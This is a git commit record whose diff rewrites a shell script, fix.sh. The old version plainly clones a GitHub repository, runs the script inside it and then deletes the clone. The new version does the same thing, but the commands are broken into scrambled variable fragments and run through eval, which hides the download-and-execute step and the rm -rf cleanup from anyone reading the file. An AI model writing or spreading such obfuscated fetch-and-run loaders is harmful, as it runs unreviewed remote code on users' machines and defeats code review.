2eb257bcb1222f6a6e9a8d75a9ca670158e352fa
lover3418 <lover3418@gmail.com>
2019-11-27 22:37:37 +0530

    U

--- fix.sh
+++ fix.sh
@@ -1,5 +1,3 @@
-git clone https://github.com/lover3418/temp.git
-cd temp
-bash fix.sh
-cd
-rm -rf spark/temp
+z="
+";Vz='/tem';Az='git ';Hz='/lov';Cz='e ht';Wz='p';Jz='18/t';Tz='rf s';Oz='bash';Qz='.sh';Kz='emp.';Rz='cd';Lz='git';Iz='er34';Ez='//gi';Gz='.com';Nz='emp';Pz=' fix';Sz='rm -';Bz='clon';Fz='thub';Mz='cd t';Dz='tps:';Uz='park';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$z$Oz$Pz$Qz$z$Rz$z$Sz$Tz$Uz$Vz$Wz"
